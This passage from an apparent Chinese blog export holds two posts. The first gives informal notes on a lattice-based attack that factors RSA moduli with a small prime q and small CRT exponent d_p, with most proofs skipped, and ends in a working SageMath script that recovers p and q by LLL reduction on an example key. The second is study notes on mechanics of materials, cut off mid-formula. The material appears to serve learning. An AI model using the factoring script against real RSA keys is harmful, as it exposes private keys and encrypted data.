在整数上成立。</p>\n</blockquote>\n<p>用格约化算法可以找到一个小欧里几得范数的多项式 $f(xX,yY)$ ，第一个方法是构造一个二维的格，这时高斯约化算法可以找到一个最短向量。<br>我们选择 $m=1$ ，然后我们使用同样含根 $x_0 \\ modulo \\ p$ 的辅助多项式 $f_0(x)=Nx$ ，因为 $N$ 是 $p$ 的倍数。<br>因此， $f_0$ 和 $f_p$ 的每个整数线性组合都有根 $(x_0,y_0) \\ modulo \\ p$ 。<br>此时构造一个由多项式 $f_0(xX)$ 和 $f_p(xX,yY)$ 的系数向量张成的格 $L_p$ 。这些系数向量是如下 $(2x2)$ 格基矩阵 $B_p$ 的行向量<br>$$<br>B_p=<br>\\begin{bmatrix}<br>    NX \\\\<br>    eX &amp; -Y<br>\\end{bmatrix}<br>$$<br>然后找到一个向量 $v$ 使其欧里几得范数小于 $\\frac{p}{\\sqrt{2}}$ ，这个向量可以被转换成一个满足<strong>真相2</strong>的多项式 $f(x,y)$ 。</p>\n<blockquote>\n<p><strong>引理3</strong> 令 $X=N^\\delta$ 和 $Y=N^{\\beta + \\delta}$ 满足<br>$$<br>    3\\beta + 2\\delta \\le 1 - log_N(4)<br>$$<br>则 $L_p$ 有一个最小向量 $v$ 满足 $|v|&lt;\\frac{p}{\\sqrt{2}}$<br><strong>证明</strong> 由 Minkowski 定理，…呃先不说这个，能用就行（逃</p>\n</blockquote>\n<p>通过<strong>引理3</strong>，我们知道，对每个固定的 $\\epsilon &gt; 0$ ，条件 $3\\beta + 2\\delta \\le 1 - \\epsilon$ 有适当的模量 $N$ （这里我感觉不应该是这么翻译，后面再改）。<br>假定我们通过格约化找到了一个 $L_p$ 中的向量 $v$ ，其范数小于 $\\frac{p}{\\sqrt{2}}$ ，令 $v$ 为多项式 $f(xX,yY)$ 的系数向量，应用<strong>真相2</strong>，我们知道 $f(x,y)$ 在整数上有一根 $(x_0,y_0)=(d_p,k+1)$ ，下一个定理将表明这个根可以很容易被找到。</p>\n<blockquote>\n<p><strong>引理4</strong> 令 $v=(c_0,c_1)\\cdot B_p$ 为 $L_p$ 的最短向量且满足 $|v|&lt;\\frac{p}{\\sqrt{2}}$ 则 $\\lvert c_0 \\rvert = k$ 且 $\\lvert c_1 \\rvert = qd_p$<br><strong>证明</strong> 略</p>\n</blockquote>\n<p>总结如下结论就有如下定理：</p>\n<blockquote>\n<p><strong>定理5</strong> 给定一个 RSA 公钥对 $(N,e)$ ，令 $q&lt;N^\\beta,d_p \\le N^\\delta$ 且<br>$$<br>    3\\beta + 2\\delta \\le 1 - log_N(4)<br>$$<br>则 $N$ 可以在时间 $O(log^2(N))$ 内被分解。<br><strong>证明</strong> 还是略（</p>\n</blockquote>\n<p>在之前的分析中，我们假设 $q$ 不整除 $k$ ，特殊情况下若 $k=qr$ ( $r \\in \\mathbb{Z}$ )，我们得到了类似于以下更强结果之前的推理（百度翻译的）</p>\n<blockquote>\n<p><strong>定理6</strong> 给定一个RSA公钥对$(N,e)$，令$q&lt;N^\\beta,d_p \\le N^\\delta$且<br>$$<br>    k=qr \\ and \\ 3\\beta + 2\\delta \\le 1 - log_N(4)<br>$$<br>则 $N$ 可以在时间 $O(log^2(N))$ 内被分解。<br><strong>证明</strong> 又双叒叕是略（</p>\n</blockquote>\n<p>有趣的是，在定理 6 中选择 $\\beta=\\frac{1}{2}$ 会有一个界 $\\delta \\le \\frac{1}{4}-log_N(4)$ ，这与 Wiener 的界差不多。</p>\n<h3 id=\"将界提升到-beta-lt-N-0-382\"><a href=\"#将界提升到-beta-lt-N-0-382\" class=\"headerlink\" title=\"将界提升到 $\\beta &lt; N^{0.382}$\"></a>将界提升到 $\\beta &lt; N^{0.382}$</h3><p>这里将界提升到 $\\beta &lt; \\frac{3-\\sqrt{5}}{2} \\approx N^{0.382}$ 。<br>上面我们使用<strong>真相2</strong>的时候选择 $m=1$ ，现在一般化方法到任意 $m$ 。<br>定义 $x$ 移位多项式（这个也是百度翻译）<br>$$<br>    g_{m,i,j}(x,y)=N^{max(0,m-j)}x^if^j_p(x,y)<br>$$<br>注意到，每个多项式 $g_{m,i,j}$ 的线性组合都有零点 $(x_0,y_0)=(d_p,k+1)\\ modulo \\ p^m$ 。<br>确定一个格维数 $n$ ，然后用 $g_{m,i,j}(xX,yY)$ 的系数向量来构造一个 $n$ 维格 $L_p$ ，其中 $j=0…n-1$ ， $i=n-j-i$ 。参数 $m$ 是 $n$ 的函数且须进行优化。<br>比如选取 $n=4$ ， $m=2$ ，格 $L_p$ 由如下行向量张成<br>$$<br>B_p=<br>\\begin{bmatrix}<br>    N^2X^3 \\\\<br>    eNX^3 &amp; -NX^2Y \\\\<br>    e^2X^3 &amp; -2eX^2Y &amp; XY^2 \\\\<br>    e^3X^3 &amp; -3e^2X^2Y &amp; 3eXY^2 &amp; -Y^3<br>\\end{bmatrix}<br>$$<br>注意到，之前的 $L_p$ 和这里的 $L_p(2)$ 是一样的。<br>为了满足<strong>真相2</strong>，我们一个满足范数小于 $\\frac{p^m}{\\sqrt{n}}$ 系数向量 $v$ ，如下引理给出了一个找这样一个向量的条件</p>\n<blockquote>\n<p><strong>引理7</strong> 对每个确定的 $\\epsilon&gt;0$ ，令 $X=\\frac{n+1}{2}N^\\delta$ ， $Y=\\frac{n+1}{2}N^{\\beta+\\delta}$ 满足<br>$$<br>    3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon<br>$$<br>然后用 LLL 算法可以在 $L_p(n)$ 中找到一个向量 $v$ 满足范数小于 $\\frac{p^m}{\\sqrt{n}}$ 。<br><strong>证明</strong> 略（</p>\n</blockquote>\n<p>现在我们可以用上面的<strong>引理7</strong>与<strong>真相2</strong>结合来构造一个次数为$n$的双变量多项式 $f(x,y)$ ，该多项式最多由 $n$ 个单项式组成，有一根 $(x_0,y_0)$ ，现在问题来到如何提取根 $(x_0,y_0)$ 。<br>与<strong>引理4</strong>类似，等下写这</p>\n<blockquote>\n<p><strong>引理8</strong> 令 $X=\\frac{n+1}{2}N^\\delta$ ， $Y=\\frac{n+1}{2}N^{\\beta+\\delta}$ ，多项式 $f_p(x,y)=ex-y$ 有一根 $(x_0,y_0)\\ modulo \\ p$ 满足 $\\lvert x_0 \\rvert \\le N^\\delta$ ， $\\lvert y_0 \\rvert \\le N^{\\beta +\\delta}$ ，令 $v$ 为 $L_p(n)$ 中范数小于 $\\frac{p^m}{\\sqrt{n}}$ 的向量（ $v$ 为项式 $f(xX,yY)$ 的系数向量），然后多项式 $p(x,y)=y_0x-x_0y \\in \\mathbb{Z}$ 一定整除 $f(x,y)$ ，我们就可以通过在 $\\mathbb{Z}[x,y]$ 上分解 $f$ 找到 $p$ 。<br><strong>证明</strong> 略（</p>\n</blockquote>\n<p>总结这些结论，就有如下定理：</p>\n<blockquote>\n<p><strong>定理9</strong> 给定一个 RSA 公钥对 $(N,e)$ ，令 $q &lt; N^\\beta,d_p \\le N^\\delta$<br>且<br>$$<br>    3\\beta - \\beta^2 + 2\\delta \\le 1 - \\epsilon<br>$$<br>其中对于适当大的 $N$ （啥叫适当大）， $\\epsilon&gt;0$ 任意小，则我们可以在 $log(N)$ 确定的时间多项式内分解 $N$ 。<br><strong>证明</strong> 略（</p>\n</blockquote>\n<h3 id=\"一个模-e-的方法\"><a href=\"#一个模-e-的方法\" class=\"headerlink\" title=\"一个模 $e$ 的方法\"></a>一个模 $e$ 的方法</h3><p>好像没啥用？？？不写了</p>\n<h3 id=\"方法间的比较\"><a href=\"#方法间的比较\" class=\"headerlink\" title=\"方法间的比较\"></a>方法间的比较</h3><p>懒得写了（逃</p>\n<h2 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h2><h3 id=\"Section3\"><a href=\"#Section3\" class=\"headerlink\" title=\"Section3\"></a>Section3</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!sage</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">attack</span>(<span class=\"params\">N, e, beta, delta</span>):</span><br><span class=\"line\">    N = <span class=\"built_in\">int</span>(N)</span><br><span class=\"line\">    e = <span class=\"built_in\">int</span>(e)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"number\">3</span>*beta+<span class=\"number\">2</span>*delta &gt; <span class=\"number\">1</span>-log(<span class=\"number\">4</span>, N):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[-] Attack failed&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        X = <span class=\"built_in\">int</span>(<span class=\"built_in\">pow</span>(N, delta))</span><br><span class=\"line\">        Y = <span class=\"built_in\">int</span>(<span class=\"built_in\">pow</span>(N, (beta+delta)))</span><br><span class=\"line\">        Bp = matrix(ZZ, [[N*X, <span class=\"number\">0</span>], [e*X, -Y]])</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] LLL reduction...&#x27;</span>)</span><br><span class=\"line\">        sv = Bp.LLL()[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        c = sv*Bp ^ -<span class=\"number\">1</span></span><br><span class=\"line\">        c1 = -<span class=\"built_in\">abs</span>(c[<span class=\"number\">0</span>])     <span class=\"comment\"># k</span></span><br><span class=\"line\">        c2 = <span class=\"built_in\">abs</span>(c[<span class=\"number\">1</span>])      <span class=\"comment\"># q*dp</span></span><br><span class=\"line\">        q = <span class=\"built_in\">abs</span>((e*c2+c1*N)//(c1+<span class=\"number\">1</span>))</span><br><span class=\"line\">        p = N//q</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] Attack successed&#x27;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] p = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(p))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;[+] q = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(q))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p, q</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># from random import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># qbits = 900</span></span><br><span class=\"line\">    <span class=\"comment\"># pbits = 3138</span></span><br><span class=\"line\">    <span class=\"comment\"># dpbits = 66</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;[+] Generating parameters...&#x27;)</span></span><br><span class=\"line\">    <span class=\"comment\"># p = random_prime(2 ^ pbits)</span></span><br><span class=\"line\">    <span class=\"comment\"># q = random_prime(2 ^ qbits)</span></span><br><span class=\"line\">    <span class=\"comment\"># dp = random_prime(2 ^ dpbits)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># while True:</span></span><br><span class=\"line\">    <span class=\"comment\">#     d = (p - 1) * (randint(1 &lt;&lt; 895, 1 &lt;&lt; 905)) + dp</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#     if GCD(d, (p - 1) * (q - 1)) == 1:</span></span><br><span class=\"line\">    <span class=\"comment\">#         break</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># e = pow(d, -1, (p - 1) * (q - 1))</span></span><br><span class=\"line\">    <span class=\"comment\"># N = p * q</span></span><br><span class=\"line\">    <span class=\"comment\"># Nbits = int(N).bit_length()</span></span><br><span class=\"line\">    <span class=\"comment\"># beta = qbits/Nbits</span></span><br><span class=\"line\">    <span class=\"comment\"># delta = dpbits/Nbits</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;[+] N = &#123;&#125;&#x27;.format(N))</span></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;[+] e = &#123;&#125;&#x27;.format(e))</span></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;[+] beta = &#123;&#125;&#x27;.format(beta))</span></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;[+] delta = &#123;&#125;&#x27;.format(delta))</span></span><br><span class=\"line\">    N = <span class=\"number\">634629908805216799355967956917035397016752766546070169887547308032924761760891699780399214796824214567267154390070522978483366198289411019582748412313710079216359358255867558259121819712947017660972562997658767364245468900343296627500215831311492976020519937654664907394551244233281196085084301881491720946011495516095312100438461444736650645875530160635314476776379821792685906378511085849924665878291761636238890281686290340422138558891124650561389417569572198766305774737557276999432569512459279457704718190818264594575715474945778743504600307881900481338218715405869829242732728780155929040869667117191128487515003629576385308251284254186650906711925117856043812344169291478611645877809590138625462171489233257786403238243625811812424843820945935661305236547254826569192218598933115538295435575896652227458056744204696170806637821332028265957534034435423213071725773547809761130059315592010070432661283749890121832768362711638162670468266766356808625866527581349441814512302739394082651200775637526523353517769267014266507198162521714133402947845712189448974860772495360651769766890958881349140536387282266034095164827944286428551415655867359896643466364963634800962833486281066681776967479689689507887525855059</span></span><br><span class=\"line\">    e = <span class=\"number\">222449729494346666756992460607761795081627331408633195158207067801306565329147681510898658030387508242070227143765893175513890166451777866451978064721778354202341750518999213529606354327894502393449664534948211789294499720405305147950904692085956769722064799513485397504251091294784655828560748848569365844048162038115977508383792426755701835564072424447439243657439872604411430842404037279822672689499520052597008624952368711035998877339177834448061486065262519442303882787242038252503252910254536179033495248788991658972894666551977962064604651051056420818328840034050064445699641044377207422145434076180424757570241966515333860523020888095363402812210233331161015473008660090443148983742164413532587125663777942637230471840611787651285227528953723973668762432241634488008559578459289516131455221246160389933755148774233018937472092674461794244671504900737970090655485320247064558891268178725955788668940079001559604584196657982775865643371046971752485475409807795707098733502124948500727883742572495725371711913411783312068234668792482799143907403909681456144274826087394298716593721198894233809352032011315411881752188433540351647062223660868815946885574427181940281003433351179379410815810916817304563532735699</span></span><br><span class=\"line\">    beta = <span class=\"number\">225</span>/<span class=\"number\">1009</span></span><br><span class=\"line\">    delta = <span class=\"number\">33</span>/<span class=\"number\">2018</span></span><br><span class=\"line\">    attack(N, e, beta, delta)</span><br></pre></td></tr></table></figure>"},{"title":"材料力学笔记","date":"2023-01-24T15:27:00.000Z","_content":"\n莫名其妙考了个第一，来还个愿。\n<!--more-->\n\n最近买了台二手服务器，折腾了一些集群、容器、虚拟化之类的东西，比较偏操作也没啥好记的，就很长时间没更了。\n\n这里大致记一下概念，捋一下思路。\n\n## 绪论\n\n### 材料力学的任务\n\n使材料满足三个要求：**强度**、**刚度**、**稳定性**。\n\n### 变形固体的基本假设\n\n三个假设：**连续性**、**均匀性**、**各向同性**。\n\n### 变形与应变\n\n应变 $\\varepsilon$ 和切应变 $\\gamma$ 是度量一点处变形程度的两个基本量，量纲为一。\n\n### 杆件变形的基本形式\n\n拉伸或压缩、剪切、弯曲、扭转。\n\n## 拉伸、压缩与剪切\n\n### 直杆轴向拉伸或压缩时斜截面上的应力\n\n拉（压）杆的破坏并不总是沿横截面发生，有时沿斜截面发生。\n\n设与横截面成 $\\alpha$ 角的斜截面 $k-k$ 的面积为 $A_\\alpha$，横截面的面积为 $A$，则\n$$\nA_\\alpha = \\frac{A}{\\cos\\alpha}\n$$\n\n把应力 $p_\\alpha$ 分解成垂直于斜截面的正应力 $\\sigma_\\alpha$ 和沿斜截面的剪应力 $\\tau_\\alpha$，则\n$$\n\\sigma_\\alpha = p_\\alpha\\cos\\alpha = \\sigma\\cos^2\\alpha \\\\\\\\\n\\tau_\\alpha = p_\\alpha\\sin\\alpha = \\sigma\\cos\\alpha\\sin\\alpha = \\frac{\\sigma}{2}\\sin2\\alpha\n$$\n\n当 $\\alpha = 0$ 时，$\\sigma_\\alpha$ 达到最大值，即\n$$\n\\sigma_{\\alpha \\mathrm{max}} = \\sigma\n$$\n\n### 材料拉伸时的力学性能\n\n低碳钢的力学性能大致如下：\n\n1. 弹性阶段：应力 $\\sigma$ 与应变 $\\varepsilon$ 成正比，即有 $\\sigma = E\\varepsilon$ ，$E$ 为**弹性模量**。直线最高点对应的应力 $\\sigma_\\mathrm{p}$ 称为**比例极限**，超过这个比例极限后，还有一个**弹性极限**，这两点间虽然不是直线，但松开后变形还是可以**完全消失**的，但两点非常接近，所以实际上不作严格区分。\n2. 屈服阶段：一段小锯齿，应变**明显增加**，应力**先下降再小波动**，先下降的那个最低点为屈服阶段或屈服强度，记作 $\\sigma_\\mathrm{s}$ 。\n3. 强化阶段：恢复抵抗变形能力，最高点对应应力 $\\sigma_\\mathrm{b}$ 为**强度极限**。\n4. 局部变形阶段：过强度极限后出现缩颈\n\n铸铁在较小拉应力下就被拉断，没有屈服和缩颈现象，拉断前的应变也小，是典型的脆性材料。\n\n### 材料压缩时的力学性能\n\n> 什么？这不是饼干，这是一个压缩毛巾啊......（滑稽）\n\n低碳钢压缩时的弹性模量 $E$ 和屈服极限 $\\sigma_\\mathrm{s}$ 都和拉伸时大致相同，之后越压越扁，也越来越难压，所以得不到压缩时的强度极限。\n\n铸铁仍在较小变形下突然破坏，破坏断面法线与轴线大致成 45° - 55° 角。\n\n### 失效、安全因数和强度计算\n\n对塑性材料，$[\\sigma] = \\frac{\\sigma_\\mathrm{s}}{n_\\mathrm{s}}$；对脆性材料，$[\\sigma] = \\frac{\\sigma_\\mathrm{b}}{n_\\mathrm{b}}$。其中 $n_\\mathrm{s}$ 和 $n_\\mathrm{b}$ 称为**安全系数**，有\n$$\n\\sigma = \\frac{F_\\mathrm{N}}{A} \\leqslant [\\sigma]\n$$\n\n### 轴向拉伸或压缩时的变形\n\n$$\n\\Delta l = \\frac{F_\\mathrm{N}l}{EA} = \\frac{Fl}{EA}\n$$\n\n可以看出，对长度相同、受力相等的杆件，$EA$ 越大变形 $\\Delta l$ 就越小，所以 $EA$ 越大的材料越强，称为杆件的抗拉（压）**刚度**。\n\n试验表明，应力不超过比例极限时横向应变 $\\varepsilon'$ 与轴向应变 $\\varepsilon$ 之比是一个常数，即\n$$\n\\mu = -\\frac{\\varepsilon'}{\\varepsilon}\n$$\n$\\mu$ 称为横向变形因数或**泊松比**。之所以有个负号，是因为一般材料都是伸长时横向缩小，压缩时横向增大。\n\n### 轴向拉伸或压缩时的应变能\n\n杆件拉伸时，有 $W = \\frac12F\\Delta l$，忽略动能、热能等变化，杆件就只存到了应变能 $V_\\varepsilon = W = \\frac12F\\Delta l = \\frac{F^2l}{2EA}$，比能 $v_\\varepsilon = \\frac12\\sigma\\varepsilon$。\n\n**能量法**解题时需要计算应变能。\n\n### 拉伸、压缩超静定问题\n\n理论力学默认材料都是刚体，没法解决超静定问题，但实际上材料总是会变形的。\n\n### 温度应力和装配应力\n\n温度变化为 $\\Delta T$ 时，杆件变形为\n$$\n\\Delta l_T = \\alpha_l\\Delta T\\cdot l\n$$\n式中 $\\alpha_l$ 为材料的**线胀系数**。\n\n### 剪切和挤压的实用计算\n\n$$\n\\tau = \\frac{F_\\mathrm{S}}{A} \\leqslant [\\tau]\n$$\n\n## 扭转\n\n### 外力偶矩的计算\n\n由\n$$\n2\\pi \\times \\frac{n}{60} \\times M_\\mathrm{e} = P \\times 1000\n$$\n得出计算外力偶矩 $M_\\mathrm{e}$ 的公式为\n$$\n\\{M_\\mathrm{e}\\}_{\\mathrm{N\\cdot m}} = 9549 \\frac{\\{P\\}_\\mathrm{kW}}{\\{n\\}_\\mathrm{r/min}}\n$$\n\n### 纯剪切\n\n对各向同性材料，三个弹性常数 $E,G,\\mu$ 之间存在下列关系：\n$$\nG = \\frac{E}{2(1+\\mu)}\n$$\n\n### 圆轴扭转时的应力\n\n最大切应力\n$$\n\\tau_\\mathrm{max} = \\frac{T}{W_\\mathrm{t}}\n$$\n式中 $W_\\mathrm{t}=I_p/R$ 为**抗扭(twist)截面系数**。\n圆截面的抗扭截面系数为\n$$\nW_\\mathrm{t} = \\frac{\\pi D^3}{16}\n$$\n空心圆截面的抗扭截面系数为\n$$\nW_\\mathrm{t} = \\frac{\\pi}{16D}(D^4 - d^4) = \\frac{\\pi D^3}{16}(1 - \\alpha^4)\n$$\n\n### 圆轴扭转时的变形\n\n距离为 $l$ 的两个横截面之间的**相对转角**为\n$$\n\\varphi = \\frac{Tl}{G I_\\mathrm{p}}\n$$\n$\\varphi$ 的变化率 $\\varphi'$ 为**单位长度扭转角**，单位为 rad/m，即\n$$\n\\varphi'_\\mathrm{max} = \\frac{T}{G I_\\mathrm{p}} \\leqslant [\\varphi']\n$$\n式中 $I_\\mathrm{p}$ 为横截面对圆心 $O$ 点的极惯性矩，即\n$$\nI_\\mathrm{p} = \\int_A \\rho^2 \\mathrm{d}A\n$$\n圆截面的 $I_\\mathrm{p} = \\frac{\\pi D^4}{32}$，空心圆截面的 $I_\\mathrm{p} = \\frac{\\pi D^4}{32}(1 - \\alpha^4)$。\n\n### 圆柱形密圈螺旋弹簧的应力和变形\n\n弹簧最大切应力\n$$\n\\tau_\\mathrm{max} = \\left(\\frac{4c-1}{4c-4}+\\frac{0.615}{c}\\right)\\frac{8FD}{\\pi d^3} = k\\frac{8FD}{\\pi d^3}\n$$\n式中 $c=\\frac Dd$ 为**弹簧指数**，$k$ 为曲度系数。\n\n#### 刚度系数\n\n$$\nC = \\frac{Gd^4}{8D^3n} = \\frac{Gd^4}{64R^3n}\n$$\n代表弹簧抵抗变形的能力。\n变形 $\\lambda = \\frac{F}{C}$ 。\n\n### 非圆截面杆扭转的概念\n\n$$\n\\tau_\\mathrm{max} = \\frac{T}{\\alpha hb^2}\n$$\n\n## 弯曲内力\n\n### 弯曲的概念和实例\n\n以**弯曲**变形为主的杆件习惯上称为**梁**。\n\n### 剪力和弯矩\n\n符号规定：\n\n* 剪力：截面 $m-m$ 的左段对右段向上相对错动时，截面 $m-m$ 上的剪力规定为正；反之为负。\n* 弯矩：截面 $m-m$ 处弯曲变形凸向下时，截面 $m-m$ 上的弯矩规定为正；反之为负。\n\n计算剪力和弯矩时注意考虑**支座反力**。\n弯矩方程对距离求导为剪力方程。\n\n### 平面曲杆的弯曲内力\n\n分析时取圆心角为 $\\varphi$ 的横截面 $m-m$ 将曲杆分成两部分，然后列平衡方程。\n\n符号规定：\n\n* 引起**拉伸**变形的轴力 $F_\\mathrm{N}$ 为正\n* 使轴线**曲率增加**的弯矩 $M$ 为正\n* 以剪力 $F_\\mathrm{S}$ 对所考虑的一段曲杆内任一点取矩，若力矩为**顺时针**方向，则剪力 $F_\\mathrm{S}$ 为正\n\n## 弯曲应力\n\n### 概述\n\n弯矩 $M$ 只与横截面上的正应力 $\\sigma$ 有关，剪力 $F_\\mathrm{S}$ 只与横截面上的切应力 $\\tau$ 有关。\n\n梁中间段上剪力为零，弯矩为常量的情况称为**纯弯曲**。\n\n梁发生弯曲变形时长度不变的纤维层称为中性层，中性层与横截面的交线称为**中性轴**。\n\n### 横力弯曲时的正应力\n\n工程实际中觉的弯曲问题多为**横力弯曲**，此时梁的横截面上不仅有**正应力**而且有**切应力**。\n\n一般情况下，最大正应力 $\\sigma_\\mathrm{max}$ 发生于弯矩最大的截面上，且离中性轴最远处，即\n$$\n\\sigma_\\mathrm{max} = \\frac{M_\\mathrm{max}y_\\mathrm{max}}{I_z}\n$$\n引入记号\n$$\nW = \\frac{I_z}{y_\\mathrm{max}}\n$$\n则有\n$$\n\\sigma_\\mathrm{max} = \\frac{M_\\mathrm{max}}{W}\n$$\n$W$ 称为**抗弯截面系数**，与截面的几何形状有关，单位为 $\\mathrm{m}^3$ 。\n\n若截面是高为 $h$、宽为 $b$ 的矩形，则\n$$\nW = \\frac{I_z}{h/2} = \\frac{bh^3/12}{h/2} = \\frac{bh^2}{6}\n$$\n若截面是直径为 $d$ 的圆形，则\n$$\nW = \\frac{I_z}{d/2} = \\frac{\\pi d^4/64}{d/2} = \\frac{\\pi d^3}{32}\n$$\n类似地，空心圆形截面的抗弯截面系数为\n$$\nW = \\frac{\\pi d^3(1-\\alpha^4)}{32}\n$$\n弯曲正应力的强度条件为\n$$\n\\sigma_\\mathrm{max} = \\frac{M_\\mathrm{max}}{W} \\leqslant [\\sigma]\n$$\n\n### 弯曲切应力\n\n$$\nS_z^* = \\int_{A_1}y_1\\mathrm{d}A\n$$\n是横截面的部分面积 $A_1$ 对中性轴的静矩。\n\n一般说，在剪力为最大值的截面的中性轴上，出现最大切应力，且\n$$\n\\tau_\\mathrm{max} = \\frac{F_\\mathrm{Smax}S^*_\\mathrm{zmax}}{I_z b}\n$$\n\n**矩形**截面梁的最大切应力\n$$\n\\tau_\\mathrm{max} = \\frac{3}{2}\\frac{F_\\mathrm{S}}{bh}\n$$\n为平均切应力的 1.5 倍。\n\n**圆形**截面梁的最大切应力\n$$\n\\tau_\\mathrm{max} = \\frac43\\frac{F_\\mathrm{S}}{\\pi R^2}\n$$\n为平均切应力的 $\\frac43$ 倍。\n\n### 提高弯曲强度的措施\n\n对抗拉和抗压强度相同的材料（如碳钢）宜采用中性轴对称的截面，对抗拉和抗压强度不相等的材料（如铸铁）宜采用中性轴**偏向于受拉一侧**的截面形状。\n如能使 $y_1$ 和 $y_2$ 之比接近于下列关系：\n$$\n\\frac{\\sigma_\\mathrm{tmax}}{\\sigma_\\mathrm{cmax}} = \\frac{M_\\mathrm{max}y_1}{Iz}/\\frac{M_\\mathrm{max}y_2}{Iz} = \\frac{y_1}{y_2} = \\frac{[\\sigma_\\mathrm{t}]}{[\\sigma_\\mathrm{c}]}\n$$\n式中 $[\\sigma_\\mathrm{t}]$ 和 $[\\sigma_\\mathrm{c}]$ 分别表示拉伸（Tension）和压缩（Compression）的许用应力，则最大拉应力和最大压应力可同时接近许用应力。\n强度校核时超过百分之 $5$ 以内都可接受（跟开车超速一点点不扣分差不多）。\n\n## 弯曲变形\n\n### 挠曲线的微分方程\n\n发生弯曲变形时，变形前为直线的梁轴线，变形后成为一条连续且光滑的曲线，称为**挠曲线**。\n\n### 用积分法求弯曲变形\n\n边界条件：在固定端，挠度和转角都为零，在铰支座上，挠度为零。\n$$\nEIw'' = M(x)\n$$\n然后对 $x$ 积分两次，代入边界条件和连续条件确定积分常数，得到挠曲线方程。\n注意 $w'$ 即为 $\\theta$ 。\n\n### 用叠加法求弯曲变形\n\n**弯曲变形很小**且材料服从**胡克定律**时，挠曲线的微分方程是线性的。\n\n## 应力和应变分析 强度理论\n\n### 应力状态概述\n\n切应力等于零的面称为**主平面**，主平面上的正应力称为主应力。\n\n### 二向和三向应力状态的实例\n\n圆筒的壁厚 $\\delta$ 远小于它的内径 $D$ 时，称为**薄壁圆筒**。若封闭的薄壁圆筒所受内压为 $p$ ，则其横截面上应力\n$$\n\\sigma' = \\frac FA = \\frac{p\\cdot\\frac{\\pi D^2}{4}}{\\pi D\\delta} = \\frac{pD}{4\\delta}\n$$\n纵向截面上应力\n$$\n\\sigma'' = \\frac{pD}{2\\delta}\n$$\n\n在研究一点的应力状态时，通常用 $\\sigma_1,\\sigma_2,\\sigma_3$ 代表该点的三个主应力，并以 $\\sigma_1$ 代表代数值最大的主应力，$\\sigma_3$ 代表代数值最小的主应力，即 $\\sigma_1 \\geqslant \\sigma_2 \\geqslant \\sigma_3$ 。\n\n### 二向应力状态分析————解析法\n\n$\\sigma_x$ 和 $\\tau_{xy}$ 是**法线与 $x$ 轴平行**的面上的正应力和切应力；$\\sigma_y$ 和 $\\tau_{yx}$ 是**法线与 $y$ 轴平行**的面上的正应力和切应力。\n符号规定：正应力拉正压负，切应力对单元体内任意点的矩为**顺时针**转向时为正，反之为负，这里与平常不同。\n取任意斜截面，其外法线 $n$ 与 $x$ 轴的夹角为 $\\alpha$ 。规定：由 $x$ 轴转到**外法线** $n$ 为**逆时针**转向时，则 $\\alpha$ 为正。\n\n$$\n\\left.\n\\begin{aligned}\n\\sigma_\\mathrm{max} 